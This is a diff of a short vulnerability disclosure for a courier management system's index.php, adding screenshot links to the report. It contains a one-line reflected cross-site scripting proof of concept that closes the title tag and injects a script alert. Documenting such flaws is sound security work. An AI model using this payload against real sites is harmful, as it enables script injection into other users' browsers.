@@ -5,10 +5,10 @@
 * Version: 1.0  
 
 * Vulnerable file:index.php
-![image]()  
+![image](https://github.com/BigTiger2020/2023/blob/main/best-courier-management-system/xss-1.png)  
 
 
 * POC:  
 </TiTlE><ScRiPt>alert(1)</ScRiPt>
 
-![image]()   
+![image](https://github.com/BigTiger2020/2023/blob/main/best-courier-management-system/xss-m.png)   
